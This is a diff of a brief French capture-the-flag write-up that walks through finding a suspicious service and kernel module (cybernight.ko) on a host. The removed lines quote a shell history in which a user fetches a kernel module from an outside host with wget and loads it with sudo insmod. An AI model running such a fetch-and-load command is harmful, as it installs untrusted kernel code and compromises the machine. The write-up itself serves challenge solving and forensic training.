@@ -1,17 +1,10 @@
 # 1
 
-regarder l'historique des commandes et constater :
-
-```
-    1  passwd user
-    2  wget https://ppng.io/goodboi.ko -O /dev/shm/goodboi.ko && sudo insmod /dev/shm/goodboi.ko
-    3  ls -lah
-    4  ls -lah /
-    5  ls -lah /root
-    6  sudo ls -lah /root
-    7  history
-```
+1. lire l'énoncé
+2. remarquer le "**services**"
+3. lister les services et constater le service cybernight.service (flag part1)
+4. lister son contenu et constater /var/lib/cybernight.ko (flag part2)
 
 # 2 
 
-flag: CYBN{goodboi.ko}
+flag: CYBN{cybernight.service:/var/lib/cybernight.ko}
